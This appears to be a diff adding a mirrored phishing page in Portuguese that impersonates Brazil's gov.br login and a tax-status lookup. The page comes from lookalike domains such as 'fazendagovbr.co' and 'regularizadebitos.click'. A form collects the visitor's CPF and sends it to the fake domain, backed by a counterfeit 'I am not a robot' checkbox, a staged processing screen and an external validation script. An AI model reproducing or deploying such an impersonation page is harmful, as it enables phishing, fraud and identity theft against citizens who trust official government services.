@@ -1,0 +1,224 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<!-- Mirrored from regularizadebitos.click/gov/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 Jun 2026 01:21:40 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from seguir.fazendagovbr.co/cdn.lineicons.com/5.1/duotone/lineicons-duotone.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Oct 2026 00:31:21 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="../../cdn.lineicons.com/5.1/line/lineicons.html" />
+    <link rel="stylesheet" href="../../cdn.lineicons.com/5.1/solid/lineicons-solid.html" />
+    <link rel="stylesheet" href="../../cdn.lineicons.com/5.1/duotone/lineicons-duotone.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta - Situação Fiscal</title>
+</head>
+
+<style>
+    @import url('https://fonts.cdnfonts.com/css/rawline');
+    body { font-family: 'Rawline', sans-serif; }
+    .captcha-box {
+        background: #f9f9f9;
+        border: 1px solid #d8d8d8;
+        border-radius: 4px;
+        padding: 10px 14px;
+        min-height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        cursor: pointer;
+        user-select: none;
+        transition: border-color 0.2s, background 0.2s;
+        width: 100%;
+        text-align: left;
+        font: inherit;
+        color: inherit;
+        -webkit-tap-highlight-color: transparent;
+        touch-action: manipulation;
+    }
+    .captcha-box:hover { border-color: #c1c1c1; background: #f0f0f0; }
+    .captcha-box:focus { outline: 2px solid #2563eb; outline-offset: 2px; }
+    .captcha-box.verified { cursor: default; border-color: #1e8e3e; background: #f9f9f9; }
+    .captcha-box.verified:hover { background: #f9f9f9; }
+    .captcha-check {
+        width: 22px;
+        height: 22px;
+        min-width: 22px;
+        border: 2px solid #c1c1c1;
+        border-radius: 2px;
+        background: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background 0.15s, border-color 0.15s;
+    }
+    .captcha-box.verified .captcha-check {
+        background: #1e8e3e;
+        border-color: #1e8e3e;
+    }
+    .captcha-check svg { opacity: 0; transition: opacity 0.15s; }
+    .captcha-box.verified .captcha-check svg { opacity: 1; }
+    .captcha-label { font-size: 14px; color: #555; margin-left: 12px; }
+    .captcha-logo { height: 28px; width: auto; }
+    @keyframes modalGlowMove {
+        0% { transform: translateX(-120%); opacity: 0; }
+        40% { opacity: 0.9; }
+        100% { transform: translateX(120%); opacity: 0; }
+    }
+    .fullscreen-loader-bg {
+        position: absolute;
+        inset: 0;
+        background:
+            radial-gradient(1000px 520px at 12% 10%, rgba(59, 130, 246, 0.12), rgba(255, 255, 255, 0) 70%),
+            radial-gradient(900px 480px at 88% 82%, rgba(14, 165, 233, 0.10), rgba(255, 255, 255, 0) 70%),
+            linear-gradient(140deg, rgba(248, 250, 252, 0.98), rgba(241, 245, 249, 0.98));
+    }
+    .fullscreen-loader-shine {
+        position: absolute;
+        inset: 0;
+        overflow: hidden;
+        pointer-events: none;
+    }
+    .fullscreen-loader-shine::after {
+        content: "";
+        position: absolute;
+        top: -20%;
+        left: -35%;
+        width: 35%;
+        height: 140%;
+        background: linear-gradient(90deg, rgba(255,255,255,0), rgba(59,130,246,0.16), rgba(255,255,255,0));
+        transform: skewX(-20deg);
+        animation: modalGlowMove 2.4s linear infinite;
+    }
+</style>
+                
+<body class="bg-slate-100 min-h-screen flex flex-col px-4 py-6">
+    <header class="w-full max-w-5xl mx-auto flex items-center justify-between mb-6">
+        <a href="#" class="flex items-center">
+            <img src="../assets/images/logo.html" alt="Logo" class="w-30 h-20 p-1">
+        </a>
+        <div class="hidden sm:flex items-center gap-4 text-xs text-slate-700">
+            <span class="flex items-center gap-1 cursor-pointer">
+                <i class="lni lnis-adjust"></i>
+                <span>Alto contraste</span>
+            </span>
+            <span class="flex items-center gap-1 cursor-pointer">
+                <i class="lni lnis-users"></i>
+                <span>VLibras</span>
+            </span>
+        </div>
+    </header>
+
+    <div class="w-full max-w-5xl mx-auto flex flex-col md:flex-row bg-[url('../assets/images/banner-fundo.png')] bg-cover bg-center shadow-[0_18px_50px_rgba(15,23,42,0.35)] overflow-hidden">
+        <aside class="hidden md:block md:w-1/2 bg-white">
+            <img src="../assets/images/identidade.html" alt="Identidade gov.br" class="w-full h-full object-cover">
+        </aside>
+        <main class="w-full md:w-1/2 bg-white p-6 md:p-8">
+            <div class="card space-y-4">
+                <h3 class="text-base font-semibold text-slate-900">Identifique-se no gov.br com:</h3>
+                <div class="border-0 rounded-none bg-transparent">
+                    <button type="button" class="w-full flex items-center gap-3 px-4 py-3 text-sm text-slate-800">
+                        <img src="../assets/images/id-card.html" alt="" class="w-5 h-5">
+                        <span>Número do CPF</span>
+                    </button>
+                    <div class="px-4 py-3 space-y-3">
+                        <p class="text-xs text-slate-700">
+                            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+                        </p>
+                        <form action="https://seguir.fazendagovbr.co/cdn.lineicons.com/5.1/resultado/index.html" method="get" id="form-cpf" class="space-y-4">
+                            <div class="space-y-1">
+                                <label for="cpf" class="text-xs font-medium text-slate-700">CPF</label>
+                                <input id="cpf" name="cpf" type="text" inputmode="numeric" placeholder="Digite seu CPF" class="w-full px-3 py-2 border border-gray-300 rounded-none text-sm focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 bg-white" value="">
+                            </div>
+                            <button type="button" id="captcha-box" class="captcha-box" aria-label="Marque para verificar que não é um robô">
+                                <span class="flex items-center flex-1 min-w-0">
+                                    <span class="captcha-check">
+                                        <svg width="14" height="14" viewBox="0 0 18 18" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 4.5L6.75 12.75L3 9"/></svg>
+                                    </span>
+                                    <span class="captcha-label">Não sou um robô</span>
+                                </span>
+                                <img src="../www.gstatic.com/recaptcha/api2/logo_48.html" alt="" class="captcha-logo ml-2" draggable="false">
+                            </button>
+                            <div class="button-panel mt-2">
+                                <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-full text-sm font-semibold hover:bg-blue-700 transition duration-300">
+                                    Continuar
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <label class="text-xs font-semibold text-slate-700 mt-4 block">Outras opções de identificação:</label>
+                <hr class="border-slate-200 -mt-1 mb-2">
+
+                <div class="space-y-1 text-xs text-slate-800">
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="../assets/images/bank.html" alt="" class="w-5 h-5">
+                        <span>Login com seu banco</span>
+                        <span class="ml-2 text-[0.55rem] px-2 py-0.5 rounded bg-[#008C32] text-white">SUA CONTA SERÁ PRATA</span>
+                    </button>
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="../assets/images/qrcode.html" alt="" class="w-5 h-5">
+                        <span>Login com QR code</span>
+                    </button>
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="../assets/images/cert.html" alt="" class="w-5 h-5">
+                        <span>Seu certificado digital</span>
+                    </button>
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="../assets/images/nuvem.html" alt="" class="w-5 h-5">
+                        <span>Seu certificado digital em nuvem</span>
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div id="modal-loading" class="fixed inset-0 z-50 hidden items-center justify-center">
+        <div class="fullscreen-loader-bg"></div>
+        <div class="fullscreen-loader-shine"></div>
+        <div class="relative z-10 w-full h-full flex flex-col items-center justify-center px-6 text-center">
+            <img src="../assets/images/logo.html" alt="Logo" class="w-48 h-20 object-contain drop-shadow-[0_8px_18px_rgba(15,23,42,0.12)]">
+            <div class="mt-5 w-16 h-16 rounded-full border-4 border-slate-200 border-t-blue-600 animate-spin"></div>
+            <div class="mt-5 space-y-1.5 max-w-xl">
+                <h2 class="text-2xl font-bold text-slate-900 tracking-wide">Processando consulta</h2>
+                <p id="loading-status-text" class="text-sm text-slate-600">Preparando validação dos dados...</p>
+            </div>
+            <div class="mt-6 w-full max-w-xl">
+                <div class="w-full h-2.5 bg-slate-200/70 rounded-full overflow-hidden border border-slate-300/60">
+                    <div id="loading-progress-bar" class="h-full bg-gradient-to-r from-blue-600 via-blue-500 to-cyan-500 rounded-full transition-all duration-300" style="width: 4%;"></div>
+                </div>
+                <div class="flex justify-between mt-1.5">
+                    <span class="text-[0.72rem] text-slate-600">Aguarde alguns instantes</span>
+                    <span id="loading-progress-text" class="text-[0.72rem] font-semibold text-slate-700">0%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-sem-cadastro" class="fixed inset-0 z-50 hidden items-center justify-center bg-transparent" role="dialog" aria-modal="true" aria-labelledby="modal-sem-cadastro-titulo">
+        <div class="bg-white rounded-xl shadow-xl max-w-md mx-4 p-6 text-center">
+            <div class="w-14 h-14 rounded-full bg-emerald-100 flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+            </div>
+            <h2 id="modal-sem-cadastro-titulo" class="text-lg font-semibold text-slate-800 mb-2">Consulta realizada</h2>
+            <p class="text-sm text-slate-600 mb-6">O CPF informado não possui pendências declaratórias.</p>
+            <button type="button" onclick="document.getElementById('modal-sem-cadastro').classList.add('hidden'); document.getElementById('modal-sem-cadastro').classList.remove('flex');" class="w-full px-4 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 transition">
+                Entendi
+            </button>
+        </div>
+    </div>
+
+    <script src="../assets/js/validacaoda1eda1e.html?v=1775573484"></script>
+        <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"f0cb857a8dbc47b59d5cd5f71a819492","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from regularizadebitos.click/gov/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 07 Jun 2026 01:21:45 GMT -->
+
+<!-- Mirrored from seguir.fazendagovbr.co/cdn.lineicons.com/5.1/duotone/lineicons-duotone.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Oct 2026 00:32:09 GMT -->
+</html>
